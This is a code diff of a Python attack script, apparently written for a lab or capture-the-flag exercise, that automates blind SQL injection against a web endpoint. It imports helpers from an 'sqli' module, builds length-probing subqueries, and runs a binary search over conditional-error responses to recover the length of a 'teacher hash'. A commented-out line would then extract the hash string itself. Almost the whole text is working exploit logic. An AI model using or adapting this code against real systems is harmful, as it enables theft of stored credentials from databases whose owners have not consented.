@@ -4,7 +4,7 @@ from sqli import question
 from sqli import get_length
 from sqli import get_count
 from sqli import binary_search
-from sqli import get_string
+#from sqli import get_string
 import requests
 
 req = lambda url: requests.get(url)
@@ -80,7 +80,7 @@ hash_len = get_length(
 print(F"Length of teacher hash: {hash_len}")
 '''
 # binary search
-length_q= lambda sub_query,test,i: F"select length(({sub_query}))>{i}"
+length_q= lambda sub_query,i: F"select length(({sub_query}))>{i}"
 test = binary_search(
     req=req,
     sqli_truth_condition=conditional_error,
@@ -89,13 +89,12 @@ test = binary_search(
     outer_query=length_q,
     inner_query=teacher_hash_query,
     query_encoder=query_encoder,
-    pos=123,
     lo=1,
-    hi=50,
+    hi=100,
     comment="%23",
     debug=False
 )
-print(F"testing bin search: {test}")
+print(F"Lenth of teacher hash this time binary search: {test}")
 '''
 teacher_hash = get_string(url=url, base_query=blind_sqli_truthy, sub_query=teacher_hash_query, response_truth_condition=conditional_error, strlen=hash_len, query_encoder=query_encoder)
 '''
